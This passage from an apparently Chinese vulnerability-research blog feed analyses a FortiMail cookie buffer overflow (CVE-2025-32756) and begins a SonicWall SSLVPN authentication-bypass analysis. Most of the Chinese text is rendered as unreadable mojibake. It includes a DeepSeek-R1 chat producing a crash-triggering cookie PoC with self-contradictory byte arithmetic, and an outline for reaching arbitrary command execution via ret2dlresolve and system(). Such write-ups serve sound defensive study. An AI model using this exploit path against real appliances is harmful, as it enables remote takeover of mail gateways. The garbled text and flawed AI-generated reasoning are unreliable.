(desta_1[v16 + <span class="number">2</span>] &amp; <span class="number">0xDF</span>) == <span class="number">0x41</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 += <span class="number">2</span>;</span><br><span class="line">          n10_1 = <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ++v14;</span><br><span class="line">        *v13 = n10_1;</span><br><span class="line">        ++v15;</span><br><span class="line">        v16 = v14;</span><br><span class="line">        ++v13;</span><br><span class="line">        n10_1 = desta_1[v14];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n10_1 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(&amp;src_ + v15) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(desta_1, &amp;src_);</span><br><span class="line">    s_2 = authhash;</span><br><span class="line">    authhash_len = <span class="built_in">strlen</span>(authhash);</span><br><span class="line">    size_1 = <span class="built_in">strlen</span>(payload);</span><br><span class="line">    s1_2 = <span class="built_in">malloc</span>(size_1);</span><br><span class="line">    size_2 = size_1;</span><br><span class="line">    <span class="keyword">if</span> ( s1_2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = EVP_ENCODE_CTX_new();</span><br><span class="line">      v21 = v20;</span><br><span class="line">      <span class="keyword">if</span> ( !v20 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      EVP_DecodeInit(v20);</span><br><span class="line">      out_len = <span class="number">16</span>;</span><br><span class="line">      src__1[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">      s1 = out;</span><br><span class="line">      <span class="keyword">if</span> ( EVP_DecodeUpdate(v21, out, &amp;out_len, authhash, authhash_len) &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°å¼€å¤´ä¼šä½¿ç”¨ sscanf å¤„ç†ä¼ å…¥çš„å‚æ•°ï¼ŒæŒ‰ç…§æ ¼å¼å–å‡ºå…¶ä¸­çš„ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ Eraã€Payload å’Œ AuthHashï¼Œè¿™åˆšå¥½æ˜¯è¯·æ±‚ä¸­çš„ Cookie å‚æ•°å†…å®¹ï¼Œè€Œæ–°ç‰ˆæœ¬é™åˆ¶äº† AuthHash å‚æ•°çš„é•¿åº¦ã€‚</p>
<h1 id="æ¼æ´åˆ†æ-ğŸ¤–"><a href="#æ¼æ´åˆ†æ-ğŸ¤–" class="headerlink" title="æ¼æ´åˆ†æ(ğŸ¤–)"></a>æ¼æ´åˆ†æ(ğŸ¤–)</h1><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨å¤§æ¨¡å‹è‡ªåŠ¨åˆ†æå¯èƒ½çš„æ¼æ´æˆå› ï¼Œå¹¶ä¸”è‡ªåŠ¨æ„é€  poc è¯·æ±‚ï¼Œè¿™é‡Œä½¿ç”¨ DeepSeek-R1 æ¨¡å‹ã€‚</p>
<p>ğŸ¤ºï¼šç°åœ¨æˆ‘æ­£åœ¨å¤ç°æŸä¸ª CVE æ¼æ´ï¼Œæˆ‘é€šè¿‡äºŒè¿›åˆ¶è¡¥ä¸å¯¹æ¯”æ‰¾åˆ°äº†å¯èƒ½å’Œè¿™ä¸ªæ¼æ´æœ‰å…³çš„å‡½æ•°ï¼Œè¯·ä½ åˆ†ææ–°æ—§ä¸¤ä¸ªç‰ˆæœ¬çš„å‡½æ•°ï¼Œå‘Šè¯‰æˆ‘æ¼æ´çš„æˆå› æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”æ„é€ ä¸€ä¸ª poc æ•°æ®ã€‚(æ–°æ—§ç‰ˆæœ¬ cookieval_unwrap å‡½æ•°ä»£ç )</p>
<p>ğŸ¤–ï¼šé€šè¿‡åˆ†ææ–°æ—§ä¸¤ä¸ªç‰ˆæœ¬çš„ <code>cookieval_unwrap</code> å‡½æ•°ï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªå…³é”®çš„å®‰å…¨æ¼æ´åŠå…¶ä¿®å¤æ–¹æ¡ˆã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†åˆ†æï¼š</p>
<h3 id="æ¼æ´æˆå› åˆ†æ"><a href="#æ¼æ´æˆå› åˆ†æ" class="headerlink" title="æ¼æ´æˆå› åˆ†æ"></a>æ¼æ´æˆå› åˆ†æ</h3><ol>
<li><p><strong>é—®é¢˜æ ¸å¿ƒï¼šBase64è§£ç ç¼“å†²åŒºæº¢å‡º</strong></p>
<ul>
<li>æ—§ç‰ˆæœ¬ä¸­æœªå¯¹ <code>AuthHash</code> å‚æ•°çš„é•¿åº¦è¿›è¡Œé™åˆ¶</li>
<li>åœ¨ Base64 è§£ç æ—¶ï¼ˆ<code>EVP_DecodeUpdate</code> è°ƒç”¨ï¼‰ï¼Œä½¿ç”¨åŸå§‹é•¿åº¦ <code>authhash_len = strlen(authhash)</code></li>
<li>å½“ <code>AuthHash</code> å€¼è¶…è¿‡ <strong>24å­—ç¬¦</strong>æ—¶ï¼ŒBase64è§£ç åæ•°æ®ä¼šè¶…å‡ºç›®æ ‡ç¼“å†²åŒº <code>out[32]</code> çš„å®¹é‡ï¼ˆ32å­—èŠ‚ï¼‰</li>
</ul>
</li>
<li><p><strong>å…³é”®æ¼æ´ä»£ç ï¼ˆæ—§ç‰ˆæœ¬ï¼‰</strong>ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">authhash_len = <span class="built_in">strlen</span>(authhash);  <span class="comment">// æ— é•¿åº¦é™åˆ¶</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (EVP_DecodeUpdate(v21, out, &amp;out_len, authhash, authhash_len) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ä¿®å¤æ–¹æ¡ˆï¼ˆæ–°ç‰ˆæœ¬ï¼‰</strong>ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">n24 = <span class="number">24</span>;  <span class="comment">// æ–°å¢é•¿åº¦é™åˆ¶</span></span><br><span class="line"><span class="keyword">if</span> (authhash_len &lt;= <span class="number">24</span>)</span><br><span class="line">    n24 = authhash_len;</span><br><span class="line">LODWORD(authhash_len_1) = n24;  <span class="comment">// é™åˆ¶åçš„é•¿åº¦</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> (EVP_DecodeUpdate(v23, out, &amp;out_len, authhash, authhash_len_1) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h3 id="POCæ„é€ "><a href="#POCæ„é€ " class="headerlink" title="POCæ„é€ "></a>POCæ„é€ </h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># poc.py</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆè¶…é•¿AuthHashï¼ˆBase64ç¼–ç ï¼‰</span></span><br><span class="line">overflow_data = <span class="string">b&quot;A&quot;</span> * <span class="number">48</span>  <span class="comment"># è¶…è¿‡32å­—èŠ‚çš„åŸå§‹æ•°æ®</span></span><br><span class="line">authhash = base64.b64encode(overflow_data).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„é€ æ¶æ„cookie</span></span><br><span class="line">poc = <span class="string">f&quot;Era=0&amp;Payload=legit_data&amp;AuthHash=<span class="subst">&#123;authhash&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;æ¶æ„Cookie:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># éªŒè¯é•¿åº¦</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\nAuthHashé•¿åº¦: <span class="subst">&#123;<span class="built_in">len</span>(authhash)&#125;</span> (&gt;24 è§¦å‘æ¼æ´)&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(authhash) &gt; <span class="number">24</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;âœ… å¯è§¦å‘ç¼“å†²åŒºæº¢å‡º&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;âŒ é•¿åº¦ä¸è¶³&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="POCä½¿ç”¨è¯´æ˜"><a href="#POCä½¿ç”¨è¯´æ˜" class="headerlink" title="POCä½¿ç”¨è¯´æ˜"></a>POCä½¿ç”¨è¯´æ˜</h3><ol>
<li><p><strong>æ‰§è¡ŒPOCè„šæœ¬</strong>ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python3 poc.py</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>é¢„æœŸè¾“å‡º</strong>ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¶æ„Cookie:</span><br><span class="line">Era=0&amp;Payload=legit_data&amp;AuthHash=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE=</span><br><span class="line"></span><br><span class="line">AuthHashé•¿åº¦: 68 (&gt;24 è§¦å‘æ¼æ´)</span><br><span class="line">âœ… å¯è§¦å‘ç¼“å†²åŒºæº¢å‡º</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>æ¼æ´è§¦å‘æ•ˆæœ</strong>ï¼š</p>
<ul>
<li>å½“ç¨‹åºå¤„ç†è¯¥Cookieæ—¶</li>
<li><code>EVP_DecodeUpdate</code> å°è¯•å°†68å­—ç¬¦Base64è§£ç ä¸º48å­—èŠ‚æ•°æ®</li>
<li>è¶…å‡º <code>out[32]</code> ç¼“å†²åŒº16å­—èŠ‚ â†’ <strong>æ ˆç¼“å†²åŒºæº¢å‡º</strong></li>
<li>å¯èƒ½å¯¼è‡´ç¨‹åºå´©æºƒæˆ–ä»»æ„ä»£ç æ‰§è¡Œï¼ˆå–å†³äºæº¢å‡ºå†…å®¹æ§åˆ¶ï¼‰</li>
</ul>
</li>
</ol>
<h3 id="æŠ€æœ¯ç»†èŠ‚"><a href="#æŠ€æœ¯ç»†èŠ‚" class="headerlink" title="æŠ€æœ¯ç»†èŠ‚"></a>æŠ€æœ¯ç»†èŠ‚</h3><ol>
<li><p><strong>å®‰å…¨è¾¹ç•Œ</strong>ï¼š</p>
<ul>
<li>Base64è§£ç åå¤§å°å…¬å¼ï¼š<code>ceil(n/4)*3</code></li>
<li>24å­—ç¬¦Base64 â†’ æœ€å¤§18å­—èŠ‚è¾“å‡ºï¼ˆå°äº32å­—èŠ‚ç¼“å†²åŒºï¼‰</li>
<li>68å­—ç¬¦Base64 â†’ è¾“å‡º51å­—èŠ‚ï¼ˆè¶…è¿‡32å­—èŠ‚ç¼“å†²åŒºï¼‰</li>
</ul>
</li>
<li><p><strong>æ”»å‡»å‘é‡</strong>ï¼š</p>
<ul>
<li>æ”»å‡»è€…å¯é€šè¿‡ä¼ªé€ æ¶æ„Cookieè§¦å‘æ¼æ´</li>
<li>ç»“åˆROPé“¾å¯å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</li>
<li>å½±å“èº«ä»½éªŒè¯ç›¸å…³çš„cookieå¤„ç†æµç¨‹</li>
</ul>
</li>
</ol>
<blockquote>
<p>æ­¤æ¼æ´å±äºå…¸å‹çš„<strong>ç¼ºå°‘è¾“å…¥éªŒè¯å¯¼è‡´çš„æ ˆç¼“å†²åŒºæº¢å‡º</strong>ï¼ˆCWE-121ï¼‰ï¼Œå»ºè®®å¯¹æ‰€æœ‰å¤–éƒ¨è¾“å…¥è¿›è¡Œä¸¥æ ¼é•¿åº¦æ ¡éªŒã€‚</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°å¤§æ¨¡å‹å¯¹æ¼æ´çš„æˆå› ç†è§£æ˜¯æ­£ç¡®çš„ï¼Œå¹¶ä¸”ä¹Ÿç»™å‡ºäº†å¯ä»¥ç”¨äºæµ‹è¯•çš„ poc ä»£ç ï¼Œä½†æ˜¯ç”±äºåç¼–è¯‘ä»£ç å­˜åœ¨ä¿¡æ¯ä¸¢å¤±ï¼Œè„šæœ¬ä¸­æº¢å‡ºåˆ°è¿”å›åœ°å€éœ€è¦çš„ padding é•¿åº¦å­˜åœ¨è¯¯å·®ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>ä»¥ FortiMail 7.2.2 ç‰ˆæœ¬ä¸ºä¾‹ï¼Œæ¥åˆ†æä¸€ä¸‹è¯¥æ¼æ´åˆ©ç”¨çš„å¯è¡Œæ€§ã€‚ä½¿ç”¨å‰é¢çš„è„šæœ¬ç”Ÿæˆ poc è¯·æ±‚å‘é€åˆ° web æœåŠ¡ï¼Œå¯ä»¥åœ¨è°ƒè¯•å™¨ä¸­æ•è·åˆ°è¿™æ ·çš„å´©æºƒä¿¡æ¯</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2025-32756-3.png"
                     
                ></p>
<p>æ­¤æ—¶ rip æŒ‡å‘ ret æŒ‡ä»¤ï¼ŒåŒæ—¶ rsp ä¸­çš„å†…å®¹æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥èƒ½å¤ŸåŠ«æŒç¨‹åºæ§åˆ¶æµã€‚è€Œä¸”æº¢å‡ºçš„æ•°æ®æ˜¯ç»è¿‡ Base64 ç¼–ç çš„ï¼Œå¯ä»¥å†™å…¥ NULL å­—èŠ‚ï¼Œä½†æ˜¯è¿˜æœ‰å‡ ä¸ªé—®é¢˜éœ€è¦è§£å†³</p>
<ol>
<li>ç³»ç»Ÿå¼€å¯äº† ASLRï¼ŒCGI è¿›ç¨‹æ¯æ¬¡å´©æºƒåœ°å€éƒ½ä¼šå˜åŒ–</li>
<li>stack ç­‰åŒºåŸŸçš„å†…å­˜æ˜¯å…·æœ‰ rwx æƒé™çš„ï¼Œä½†å­˜åœ¨äºå·²çŸ¥åœ°å€ä¸­çš„ gadget éš¾ä»¥å°†æ§åˆ¶æµè½¬ç§»åˆ° stack ä¸Šé¢</li>
</ol>
<p>è€ƒè™‘åˆ°å„æ–¹é¢çš„é™åˆ¶æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨ ret2dlresolve æŠ€å·§å®ç°åˆ©ç”¨ï¼Œå› ä¸ºè¿™ç§æ–¹æ³•èƒ½ç›´æ¥è§£æä»»æ„ç¬¦å·å¹¶è°ƒç”¨ï¼Œæ— éœ€çˆ†ç ´åœ°å€ï¼Œå¦å¤– CGI ç¨‹åºçš„ RELRO ä¸º NO RELROï¼Œè¿™ä¹Ÿé™ä½äº†åˆ©ç”¨ ret2dlresolve çš„éš¾åº¦ã€‚å…³äº ret2dlresolve çš„æ–¹æ³•ç½‘ç»œä¸Šæœ‰å¾ˆå¤šæ–‡ç« ï¼Œåœ¨è¿™é‡Œä¸å†èµ˜è¿°ã€‚</p>
<p>åˆ©ç”¨ ret2dlresolve  éœ€è¦æ»¡è¶³ä¸€äº›å‰ææ¡ä»¶ï¼Œç¨‹åºæ²¡æœ‰é‡å®šä½ä¿æŠ¤æ‰€ä»¥ .dynamic æ®µæ˜¯å¯å†™çš„ï¼Œé‚£ä¹ˆåªéœ€è¦ä¸€ä¸ªå·²çŸ¥åœ°å€å¯ä»¥ä¿å­˜æˆ‘ä»¬ä¼ªé€ çš„ dynstr ç»“æ„ã€‚ç”±äºç¨‹åºå¼•ç”¨äº† memcpy å‡½æ•°ï¼Œé€šè¿‡ä½¿ç”¨åˆé€‚çš„ gadget èƒ½å¤Ÿå®ç°å°† stack ä¸Šå¯æ§çš„æ•°æ®æ‹·è´åˆ°ä¸€ä¸ªå·²çŸ¥åœ°å€ã€‚é‚£ä¹ˆåˆ©ç”¨æ€è·¯å¯ä»¥æ€»ç»“ä¸ºï¼š</p>
<ol>
<li>å¯»æ‰¾åˆ°åˆé€‚çš„ gadgetï¼Œè°ƒç”¨ memcpy å‡½æ•°å°†ä¼ªé€ çš„ dynstr ä»¥åŠéœ€è¦æ‰§è¡Œçš„å‘½ä»¤æ‹·è´åˆ°ä¸€ä¸ªå·²çŸ¥åœ°å€</li>
<li>è°ƒç”¨ memcpy å‡½æ•°ä¿®æ”¹ dynamic æ®µä¸­çš„ dynstr æŒ‡é’ˆï¼ŒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„</li>
<li>è§¦å‘ runtime resolveï¼ŒåŒæ—¶è®¾ç½®å¥½å‚æ•°ï¼Œè°ƒç”¨ system å‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤</li>
</ol>
<h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-25-254" >https://www.fortiguard.com/psirt/FG-IR-25-254<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://horizon3.ai/attack-research/attack-blogs/cve-2025-32756-low-rise-jeans-are-back-and-so-are-buffer-overflows/" >https://horizon3.ai/attack-research/attack-blogs/cve-2025-32756-low-rise-jeans-are-back-and-so-are-buffer-overflows/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-53704</title>
    <url>/2025/01/28/cve-2024-53704/</url>
    <content><![CDATA[<p>2025 å¹´ 1 æœˆ 8 æ—¥ï¼ŒSonicwall å…¬å¼€äº†å½±å“ SonicOS GEN6ã€GEN7ã€GEN8 ç¡¬ä»¶ä¸è™šæ‹ŸåŒ–è®¾å¤‡çš„ä¸€æ‰¹æ¼æ´ï¼Œå…¶ä¸­ <a class="link"   href="https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003" >CVE-2024-53704<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> è¢«æè¿°ä¸º SSLVPN èº«ä»½éªŒè¯ç»•è¿‡ï¼Œæœ¬æ–‡å¯¹æ­¤æ¼æ´è¿›è¡Œç®€è¦åˆ†æã€‚</p>
<p><strong>æ²¡æœ‰è¯æ®è¡¨æ˜è¯¥æ¼æ´å­˜åœ¨åœ¨é‡åˆ©ç”¨ï¼Œä½†é‰´äº PoC å·²ç»å…¬å¼€ï¼Œå»ºè®®ç”¨æˆ·åŠæ—¶æ›´æ–°æœ€æ–°ç‰ˆæœ¬ã€‚</strong></p>
<span id="more"></span>

<h1 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h1><p>Sonicwall å‘å¸ƒçš„å…¬å‘Šä¸­æåˆ°è¯¥æ¼æ´ä¸º SSLVPN æœåŠ¡çš„èº«ä»½éªŒè¯ç»•è¿‡ï¼Œå½±å“ SonicOS GEN7 7.1.x ä»¥åŠ GEN8 ç‰ˆæœ¬ï¼Œè¯¥å…¬å‘Šä¸­æ²¡æœ‰ç»™å‡ºä»»ä½•å…·ä½“ä¿¡æ¯ã€‚2025 å¹´ 1 æœˆ 9 æ—¥ï¼Œ<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-25-012/" >ZDI<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> å…¬å¼€äº†å…³äºè¯¥æ¼æ´æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥æ¼æ´å‡ºç°åœ¨ SSLVPN æœåŠ¡éªŒè¯ session çš„è¿‡ç¨‹ä¸­ï¼Œå…·ä½“æ¥è¯´æ˜¯ BASE64 æ ¼å¼çš„ session éªŒè¯å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´èº«ä»½éªŒè¯ç»•è¿‡ã€‚</p>
<h1 id="SSLVPN-é‰´æƒåˆ†æ"><a href="#SSLVPN-é‰´æƒåˆ†æ" class="headerlink" title="SSLVPN é‰´æƒåˆ†æ"></a>SSLVPN é‰´æƒåˆ†æ</h1><p>æœ¬ç«™çš„<a href="https://wzt.ac.cn/2024/09/05/sonicwall_dec2/">å†å²æ–‡ç« </a>å·²ç»åˆ†æè¿‡ SonicOS GEN7 7.1.x ç‰ˆæœ¬å¼€å§‹æ·»åŠ çš„å®‰å…¨å¯åŠ¨ç­–ç•¥ï¼Œä»¥åŠå¦‚ä½•è§£å¯†ç¡¬ç›˜è·å–æ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤è¿™é‡Œä¸å†èµ˜è¿°ï¼Œæ ¹æ®å…¬å‘Šï¼Œæˆ‘ä»¬åˆ†åˆ«è§£åŒ…å¾—åˆ° NSv 7.1.2-7019 å’Œ 7.1.3-7015 ä¸¤ä¸ªç‰ˆæœ¬çš„ sonicosv ç¨‹åºï¼Œç•™ä½œåç»­è¡¥ä¸åˆ†æã€‚</p>
<p>ç”±äº 7.1.x ç‰ˆæœ¬ç³»ç»Ÿä¸­å·²ç»ä¸å†ç•™æœ‰ sonicosv çš„ debug ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆåˆ†æ 7.0.x ä¸­çš„ç¨‹åºï¼Œçœ‹çœ‹ SSLVPN æœåŠ¡æ˜¯å¦‚ä½•å¯¹è¯·æ±‚è¿›è¡Œé‰´æƒçš„ã€‚</p>
<p>åœ¨ sonicosv ä¸­ï¼ŒHTTP è¯·æ±‚ä¼šé¦–å…ˆæ¥åˆ° httpServer å‡½æ•°å¤„ç†ï¼Œå®ƒåŒæ—¶è´Ÿè´£å¤„ç† apiã€sslvpn ç­‰ web è¯·æ±‚ã€‚å½“æˆ‘ä»¬å°è¯•ä»ç½‘é¡µç«¯ç™»å½• SSLVPN æœåŠ¡æ—¶ï¼Œé€šè¿‡æŠ“åŒ…å‘ç°å‘é€çš„è¯·æ±‚åŸºæœ¬éƒ½æ˜¯ <code>/api/sonicos/xxx</code>ï¼Œå³ API è¯·æ±‚ã€‚è¿›ä¸€æ­¥åˆ†æ httpServer å‡½æ•°ï¼Œä¼šå‘ç°ä»¥ä¸‹ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(_api_sonicos_ + <span class="number">7</span>), <span class="string">&quot;/cgi-bin/sshv2?mode=html&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">n4 = sub_306E703(</span><br><span class="line">       <span class="string">&quot;sshv2.html&quot;</span>,</span><br><span class="line">       _api_sonicos_[<span class="number">32</span>],</span><br><span class="line">       *(_api_sonicos_ + <span class="number">9</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">10</span>),</span><br><span class="line">       a1,</span><br><span class="line">       *(_api_sonicos_ + <span class="number">9</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">13</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">20</span>),</span><br><span class="line">       a3);</span><br><span class="line"><span class="keyword">if</span> ( n4 == <span class="number">-1</span> )</span><br><span class="line">  *(_api_sonicos_ + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(_api_sonicos_ + <span class="number">7</span>), <span class="string">&quot;/cgi-bin/telnet?html=1&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">n4 = sub_306E703(</span><br><span class="line">       <span class="string">&quot;telnet.html&quot;</span>,</span><br><span class="line">       _api_sonicos_[<span class="number">32</span>],</span><br><span class="line">       *(_api_sonicos_ + <span class="number">9</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">10</span>),</span><br><span class="line">       a1,</span><br><span class="line">       *(_api_sonicos_ + <span class="number">9</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">13</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">20</span>),</span><br><span class="line">       a3);</span><br><span class="line"><span class="keyword">if</span> ( n4 == <span class="number">-1</span> )</span><br><span class="line">  *(_api_sonicos_ + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(_api_sonicos_ + <span class="number">7</span>), <span class="string">&quot;/cgi-bin/vnc?mode=html&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">n4 = sub_306E703(</span><br><span class="line">       <span class="string">&quot;vnc.html&quot;</span>,</span><br><span class="line">       _api_sonicos_[<span class="number">32</span>],</span><br><span class="line">       *(_api_sonicos_ + <span class="number">9</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">10</span>),</span><br><span class="line">       a1,</span><br><span class="line">       *(_api_sonicos_ + <span class="number">9</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">13</span>),</span><br><span class="line">       *(_api_sonicos_ + <span class="number">20</span>),</span><br><span class="line">       a3);</span><br><span class="line"><span class="keyword">if</span> ( n4 == <span class="number">-1</span> )</span><br><span class="line">  *(_api_sonicos_ + <span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(_api_sonicos_ + <span class="number">7</span>), <span class="string">&quot;/cgi-bin&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">n4 = processSslvpnHttpRequest(a1, _api_sonicos_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>å½“è®¿é—® &#x2F;cgi-bin è·¯ç”±æ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨ processSslvpnHttpRequest å‡½æ•°ï¼Œä»å‡½æ•°åç§°æ¥çœ‹å®ƒæ˜¯ç”¨äºå¤„ç† SSLVPN è¯·æ±‚çš„ã€‚æˆ‘ä»¬çŸ¥é“ä¸€èˆ¬æƒ…å†µä¸‹ SSLVPN æœåŠ¡éƒ½ä¼šæœ‰å®¢æˆ·ç«¯åº”ç”¨ï¼ŒSonicwall ä¹Ÿä¸ä¾‹å¤–ã€‚è¿™ä¸ª VPN å®¢æˆ·ç«¯å«åš Netextenderï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯è¿æ¥ vpn æœåŠ¡å™¨è®¿é—®å†…ç½‘èµ„æºã€‚</p>
<p>å¯ä»¥æ¨æµ‹ &#x2F;cgi-bin ä¸‹é¢çš„ç«¯ç‚¹å¯èƒ½æ˜¯å®¢æˆ·ç«¯åº”ç”¨æ‰ä¼šä½¿ç”¨çš„ï¼Œå®‰è£…å®¢æˆ·ç«¯å¹¶å°è¯•è¿æ¥æœåŠ¡ï¼Œè¿æ¥æˆåŠŸæ•ˆæœå¦‚ä¸‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/CVE-2024-53704-1.png"
                     
                ></p>
<p>è¿›ä¸€æ­¥åˆ†æ processSslvpnHttpRequest å‡½æ•°ï¼Œå‘ç°å…¶ä¸­æ³¨å†Œäº†å¾ˆå¤š &#x2F;cgi-bin ç«¯ç‚¹ï¼ŒåŒ…æ‹¬ <code>/cgi-bin/welcome</code>ã€<code>/cgi-bin/homepage</code> ç­‰ï¼Œé™¤äº†å°‘æ•°å‡ ä¸ªä¸éœ€è¦èº«ä»½éªŒè¯ä¹‹å¤–ï¼Œå…¶å®ƒç«¯ç‚¹éƒ½éœ€è¦è¿›è¡Œ session éªŒè¯ã€‚</p>
<p>ä»¥ <code>/cgi-bin/sessionStatus</code> ä¸ºä¾‹ï¼Œå®ƒå¯¹åº”çš„å¤„ç†ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2F2EA51</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2, <span class="type">const</span> <span class="type">char</span> *haystack)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+1050h] [rbp-80h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+1058h] [rbp-78h]</span></span><br><span 